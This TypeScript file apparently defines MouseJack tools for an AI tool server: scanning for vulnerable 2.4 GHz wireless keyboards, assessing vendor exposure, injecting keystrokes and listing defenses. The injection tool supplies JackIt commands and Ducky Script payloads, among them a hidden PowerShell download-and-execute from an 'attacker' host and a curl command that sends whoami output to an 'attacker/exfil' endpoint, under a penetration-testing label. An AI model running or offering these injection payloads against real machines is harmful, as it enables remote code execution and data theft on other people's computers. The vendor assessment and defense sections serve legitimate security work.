import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";

// ─── Vendor Vulnerability Database ───

const VENDOR_VULNS: Record<string, { affected: boolean; affectedModels: string[]; fixAvailable: boolean; firmwareUpdateUrl: string; notes: string[] }> = {
  logitech: {
    affected: true,
    affectedModels: [
      "Unifying receivers (all models before firmware update)",
      "K360, K400, K750, K800 keyboards",
      "M510, M525, M705 mice",
      "R400, R800 wireless presenters",
      "Spotlight wireless presenter",
    ],
    fixAvailable: true,
    firmwareUpdateUrl: "https://www.logitech.com/en-us/software/unifying.html",
    notes: [
      "Logitech Unifying receivers are the most widely affected devices",
      "Firmware updates available via Logitech Unifying Software",
      "Some older receivers cannot be updated — replace with newer hardware",
      "Logitech Bolt receivers (newer) use BLE and are NOT vulnerable to MouseJack",
    ],
  },
  microsoft: {
    affected: true,
    affectedModels: [
      "Sculpt Ergonomic Mouse",
      "Wireless Mobile Mouse 4000",
      "Wireless Mouse 5000",
      "All-in-One Media Keyboard",
      "Arc Touch Mouse (non-Bluetooth)",
    ],
    fixAvailable: false,
    firmwareUpdateUrl: "N/A — Microsoft has not issued firmware updates for affected devices",
    notes: [
      "Microsoft wireless devices using proprietary 2.4 GHz are generally vulnerable",
      "No firmware update mechanism exists for most Microsoft wireless peripherals",
      "Replace with Bluetooth or wired alternatives",
      "Microsoft Bluetooth peripherals are NOT affected",
    ],
  },
  dell: {
    affected: true,
    affectedModels: [
      "KM636 Wireless Keyboard and Mouse",
      "KM714 Wireless Keyboard and Mouse",
      "WM514 Wireless Mouse",
    ],
    fixAvailable: false,
    firmwareUpdateUrl: "N/A",
    notes: [
      "Dell wireless peripherals using 2.4 GHz are affected",
      "Many Dell wireless keyboards use rebranded Logitech receivers",
      "Check if receiver is Logitech Unifying — if so, update via Logitech tools",
      "Replace with USB wired or Bluetooth alternatives",
    ],
  },
  hp: {
    affected: true,
    affectedModels: [
      "HP Wireless Elite Keyboard v2",
      "HP Wireless Mouse X3000",
      "HP Wireless Premium Keyboard",
    ],
    fixAvailable: false,
    firmwareUpdateUrl: "N/A",
    notes: [
      "HP wireless peripherals using 2.4 GHz dongles are potentially affected",
      "No firmware update path available for most models",
      "Replace with wired or Bluetooth alternatives for secure environments",
    ],
  },
  lenovo: {
    affected: true,
    affectedModels: [
      "Lenovo 500 Wireless Combo Keyboard & Mouse",
      "Lenovo Ultraslim wireless keyboard/mouse combo",
      "ThinkPad wireless peripherals (non-Bluetooth)",
    ],
    fixAvailable: false,
    firmwareUpdateUrl: "N/A",
    notes: [
      "Lenovo 2.4 GHz wireless peripherals are potentially affected",
      "Some Lenovo devices use Logitech Unifying receivers — check and update",
      "Replace with Bluetooth or wired alternatives",
    ],
  },
  amazon: {
    affected: true,
    affectedModels: [
      "AmazonBasics Wireless Keyboard",
      "AmazonBasics Wireless Mouse",
      "AmazonBasics Wireless Keyboard and Mouse Combo",
    ],
    fixAvailable: false,
    firmwareUpdateUrl: "N/A",
    notes: [
      "AmazonBasics wireless peripherals use cheap 2.4 GHz transceivers",
      "No firmware update mechanism available",
      "These are among the most vulnerable due to minimal security implementation",
      "Replace with wired or Bluetooth alternatives immediately",
    ],
  },
};

// ─── Tool 1: mousejack_scan ───

const mousejackScan: ToolDef = {
  name: "mousejack_scan",
  description:
    "MouseJack wireless device scanning guide. Returns setup instructions and commands for discovering vulnerable 2.4 GHz wireless keyboards and mice using nRF24-based hardware.",
  schema: {
    hardware: z
      .enum(["crazyradio", "hackrf"])
      .optional()
      .describe("Scanning hardware. Default: crazyradio (CrazyRadio PA with nRF24 firmware)"),
  },
  async execute(args: Record<string, unknown>): Promise<ToolResult> {
    const hardware = (args.hardware as string) ?? "crazyradio";

    if (hardware === "crazyradio") {
      return json({
        hardware: "CrazyRadio PA",
        description: "CrazyRadio PA with Bastille Research nRF24 firmware — primary MouseJack tool",
        setup: [
          "1. Get CrazyRadio PA USB dongle (~$30)",
          "2. Flash with Bastille Research nRF24 firmware:",
          "   git clone https://github.com/BastilleResearch/nrf-research-firmware",
          "   cd nrf-research-firmware",
          "   make",
          "   sudo make install (flashes CrazyRadio PA)",
          "3. Install MouseJack tools:",
          "   git clone https://github.com/BastilleResearch/mousejack",
          "   cd mousejack",
          "   pip3 install -r requirements.txt",
          "4. Verify: sudo python3 nrf24-scanner.py (should detect CrazyRadio)",
        ],
        scanCommands: [
          { tool: "mousejack", command: "sudo python3 nrf24-scanner.py -v", description: "Scan for all nRF24 devices in range (verbose)" },
          { tool: "mousejack", command: "sudo python3 nrf24-scanner.py -l -v", description: "Scan with LNA enabled for extended range" },
          { tool: "mousejack", command: "sudo python3 nrf24-sniffer.py -a <address>", description: "Sniff packets from a specific device address" },
          { tool: "mousejack", command: "sudo python3 nrf24-network-mapper.py", description: "Map all discovered nRF24 networks" },
        ],
        scanOutput: [
          "Device address (5-byte nRF24 address)",
          "Channel (2400-2525 MHz)",
          "Payload data (keystrokes if unencrypted)",
          "Device type detection (keyboard/mouse/dongle)",
        ],
        range: "Approximately 100-200 meters with CrazyRadio PA (with LNA)",
        notes: [
          "Scan may take 30-60 seconds to cover all channels",
          "Devices hop between channels — scanner checks all frequencies",
          "Keyboard traffic is more valuable than mouse traffic for injection",
          "Some devices only transmit when user is actively typing/clicking",
        ],
      });
    }

    return json({
      hardware: "HackRF One",
      description: "HackRF can be used for 2.4 GHz analysis but is not ideal for nRF24 protocol interaction",
      setup: [
        "1. HackRF can capture raw 2.4 GHz signals but cannot interact with nRF24 protocol natively",
        "2. For passive analysis: hackrf_transfer -r capture.raw -f 2400000000 -s 10000000",
        "3. Use GNU Radio with nRF24 decoder blocks for demodulation",
        "4. RECOMMENDED: Use CrazyRadio PA instead — purpose-built for nRF24 interaction",
      ],
      scanCommands: [
        { tool: "hackrf", command: "hackrf_transfer -r nrf24_capture.raw -f 2402000000 -s 2000000 -g 40 -l 32", description: "Capture raw 2.4 GHz signals (passive only)" },
        { tool: "gnuradio", command: "gnuradio-companion nrf24_decoder.grc", description: "Decode nRF24 packets with GNU Radio (requires custom flowgraph)" },
      ],
      limitations: [
        "HackRF cannot natively speak nRF24 Enhanced ShockBurst protocol",
        "Cannot perform keystroke injection via HackRF",
        "Passive analysis only — CrazyRadio PA required for active attacks",
        "Much more complex setup compared to CrazyRadio PA + MouseJack toolkit",
      ],
      recommendation: "Use CrazyRadio PA ($30) for MouseJack testing — it is purpose-built for this attack.",
    });
  },
};

// ─── Tool 2: mousejack_assess ───

const mousejackAssess: ToolDef = {
  name: "mousejack_assess",
  description:
    "Assess whether a wireless peripheral is vulnerable to MouseJack attacks based on vendor and device type. Returns vulnerability status, affected models, and remediation steps.",
  schema: {
    device_vendor: z
      .enum(["logitech", "microsoft", "dell", "hp", "lenovo", "amazon"])
      .describe("Wireless peripheral vendor/manufacturer"),
    device_type: z
      .enum(["keyboard", "mouse", "presenter"])
      .describe("Type of wireless peripheral device"),
  },
  async execute(args: Record<string, unknown>): Promise<ToolResult> {
    const vendor = args.device_vendor as string;
    const deviceType = args.device_type as string;

    const vendorInfo = VENDOR_VULNS[vendor];
    if (!vendorInfo) {
      return text(`Unknown vendor: ${vendor}`);
    }

    const keyboardRisk = deviceType === "keyboard"
      ? "CRITICAL — keystroke injection allows arbitrary command execution on target computer"
      : deviceType === "presenter"
        ? "HIGH — presenter injection can trigger keyboard shortcuts and commands"
        : "MEDIUM — mouse injection has limited impact (cursor movement, clicks)";

    const attackCapabilities: string[] = [];
    if (deviceType === "keyboard") {
      attackCapabilities.push(
        "Inject arbitrary keystrokes as if typed on the wireless keyboard",
        "Execute commands: Win+R (Run dialog) → type command → Enter",
        "Download and execute malware via PowerShell one-liner injection",
        "Exfiltrate data by opening terminal and piping to remote server",
        "Full remote code execution on target computer",
      );
    } else if (deviceType === "mouse") {
      attackCapabilities.push(
        "Inject mouse clicks at arbitrary screen positions",
        "Some MouseJack variants can inject keystrokes via mouse dongle",
        "Logitech Unifying mice can be paired with attacker keyboard for keystroke injection",
        "Move cursor to distract or annoy target user",
      );
    } else {
      attackCapabilities.push(
        "Inject presenter button presses (next/prev slide, blank screen)",
        "Some presenters share receiver with keyboard — full keystroke injection possible",
        "Trigger keyboard shortcuts via presenter button emulation",
      );
    }

    return json({
      vendor,
      deviceType,
      vulnerable: vendorInfo.affected,
      riskLevel: keyboardRisk,
      affectedModels: vendorInfo.affectedModels,
      firmwareUpdateAvailable: vendorInfo.fixAvailable,
      firmwareUpdateUrl: vendorInfo.firmwareUpdateUrl,
      attackCapabilities,
      vendorNotes: vendorInfo.notes,
      remediation: [
        vendorInfo.fixAvailable
          ? `Update firmware via: ${vendorInfo.firmwareUpdateUrl}`
          : "No firmware update available — replace device",
        "Switch to Bluetooth peripherals (not vulnerable to MouseJack)",
        "Switch to wired peripherals for high-security environments",
        "For Logitech: upgrade to Logi Bolt receivers (BLE-based, not affected)",
        "Implement RF monitoring in sensitive areas to detect MouseJack attempts",
      ],
    });
  },
};

// ─── Tool 3: mousejack_inject ───

const mousejackInject: ToolDef = {
  name: "mousejack_inject",
  description:
    "MouseJack keystroke injection guide. Returns injection methodology, payload format (Ducky Script), and attack execution steps for authorized penetration testing.",
  schema: {
    target_address: z
      .string()
      .describe("nRF24 device address of the target dongle (5-byte hex, e.g. '61:D9:50:3F:A8')"),
    payload: z
      .string()
      .optional()
      .describe("Optional Ducky Script payload to inject. If not provided, a default test payload is used."),
  },
  async execute(args: Record<string, unknown>): Promise<ToolResult> {
    const targetAddress = args.target_address as string;
    const payload = args.payload as string | undefined;

    const defaultPayload = [
      "DELAY 1000",
      "GUI r",
      "DELAY 500",
      "STRING notepad.exe",
      "ENTER",
      "DELAY 1000",
      "STRING MouseJack injection test - authorized penetration testing",
      "ENTER",
    ].join("\n");

    const activePayload = payload ?? defaultPayload;

    return json({
      targetAddress,
      methodology: [
        "1. Ensure target device has been identified via nrf24-scanner.py",
        "2. Verify the device address and channel are correct",
        "3. Create a Ducky Script payload file (attack.txt)",
        "4. Use JackIt tool for automated injection:",
        "   sudo python3 jackit.py --address " + targetAddress,
        "5. Alternative: Use nrf24-network-mapper.py to select target interactively",
        "6. Monitor injection progress — keystrokes are sent one at a time",
        "7. Injection speed: approximately 10-50 keystrokes per second",
      ],
      injectionCommands: [
        { tool: "jackit", command: `sudo python3 jackit.py --address ${targetAddress} --script attack.txt`, description: "Inject Ducky Script payload to target device" },
        { tool: "jackit", command: `sudo python3 jackit.py --address ${targetAddress} --interact`, description: "Interactive keystroke injection (type in real-time)" },
        { tool: "mousejack", command: `sudo python3 nrf24-sniffer.py -a ${targetAddress} -t 30`, description: "Verify target is active before injection (30-second sniff)" },
      ],
      payload: {
        format: "Ducky Script (compatible with USB Rubber Ducky syntax)",
        content: activePayload,
        notes: [
          "GUI = Windows key, COMMAND = Mac Command key",
          "DELAY is in milliseconds",
          "STRING types the text literally",
          "ENTER, TAB, ESCAPE, etc. are special keys",
          "ALT, CTRL, SHIFT can be combined: CTRL ALT DELETE",
        ],
      },
      examplePayloads: {
        testPayload: "GUI r\nDELAY 500\nSTRING notepad.exe\nENTER\nDELAY 500\nSTRING Test\n",
        reverseShell: "GUI r\nDELAY 500\nSTRING powershell -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')\"\nENTER\n",
        dataExfil: "GUI r\nDELAY 500\nSTRING cmd /c whoami > %TEMP%\\info.txt && curl -X POST -d @%TEMP%\\info.txt http://attacker/exfil\nENTER\n",
      },
      legalWarning: "Keystroke injection into unauthorized computers is illegal. Ensure you have explicit written authorization for penetration testing.",
      range: "100-200 meters with CrazyRadio PA (with power amplifier and directional antenna)",
    });
  },
};

// ─── Tool 4: mousejack_defense ───

const mousejackDefense: ToolDef = {
  name: "mousejack_defense",
  description:
    "MouseJack defense recommendations. Returns detection methods, firmware updates, device replacement guidance, and monitoring strategies.",
  schema: {},
  async execute(): Promise<ToolResult> {
    return json({
      overview: "MouseJack exploits vulnerabilities in 2.4 GHz wireless peripherals using nRF24 Enhanced ShockBurst protocol. Allows keystroke injection into wireless keyboards and mice from up to 200 meters.",
      detectionMethods: [
        {
          method: "RF Monitoring",
          description: "Deploy 2.4 GHz spectrum analyzer to detect unexpected nRF24 transmissions",
          tools: ["CrazyRadio PA in monitor mode", "HackRF + GNU Radio spectrum analyzer", "Wi-Spy 2.4x"],
          effectiveness: "Medium — MouseJack transmissions blend with WiFi/Bluetooth/Zigbee in 2.4 GHz band",
        },
        {
          method: "USB Device Monitoring",
          description: "Monitor for unexpected USB HID device connections that could indicate rogue dongles",
          tools: ["USBGuard (Linux)", "Device Lock (Windows)", "Endpoint protection platforms"],
          effectiveness: "Low — legitimate dongle is already connected",
        },
        {
          method: "Behavioral Analysis",
          description: "Detect anomalous keystroke patterns (superhuman typing speed, unusual key combinations)",
          tools: ["Endpoint Detection and Response (EDR)", "Custom keystroke monitoring"],
          effectiveness: "Medium — injection speed and patterns differ from human typing",
        },
        {
          method: "Network Traffic Analysis",
          description: "Detect post-exploitation activity (reverse shells, data exfiltration) triggered by injected keystrokes",
          tools: ["IDS/IPS (Snort, Suricata)", "NDR solutions", "SIEM correlation"],
          effectiveness: "Medium-High — detection of exploitation effects rather than injection itself",
        },
      ],
      firmwareUpdates: {
        logitech: {
          url: "https://www.logitech.com/en-us/software/unifying.html",
          instructions: "Download Logitech Unifying Software → Connect receiver → Update firmware",
          note: "Only Logitech provides firmware updates. Other vendors have no update mechanism.",
        },
        otherVendors: "Microsoft, Dell, HP, Lenovo, Amazon — NO firmware updates available. Replace devices.",
      },
      replacementGuidance: {
        wired: {
          recommendation: "BEST — wired peripherals eliminate all wireless attack surface",
          examples: ["Any wired USB keyboard", "Any wired USB mouse"],
        },
        bluetooth: {
          recommendation: "GOOD — Bluetooth peripherals are NOT vulnerable to MouseJack (different protocol)",
          examples: ["Logitech MX Keys (Bluetooth mode)", "Apple Magic Keyboard", "Microsoft Bluetooth peripherals"],
          caveat: "Bluetooth has its own attack surface (BlueBorne, KNOB) but is not affected by MouseJack",
        },
        logiBolt: {
          recommendation: "GOOD — Logitech Bolt uses BLE (not nRF24) and is NOT vulnerable to MouseJack",
          examples: ["Logitech MX Keys S", "Logitech MX Master 3S", "Logitech ERGO K860"],
        },
      },
      monitoringStrategies: [
        "Inventory all wireless peripherals in the organization",
        "Create a policy prohibiting 2.4 GHz wireless keyboards in sensitive areas",
        "Deploy RF monitoring in executive offices, SOC, and server rooms",
        "Include MouseJack in physical security penetration tests",
        "Add wireless peripheral security to employee security awareness training",
      ],
      policyRecommendations: [
        "Mandate wired or Bluetooth peripherals in classified/sensitive areas",
        "Prohibit personal wireless peripherals on corporate networks",
        "Include wireless peripheral assessment in procurement security review",
        "Regular wireless security audits including nRF24 scanning",
      ],
    });
  },
};

// ─── Export All MouseJack Tools ───

export const mousejackTools: ToolDef[] = [
  mousejackScan,
  mousejackAssess,
  mousejackInject,
  mousejackDefense,
];
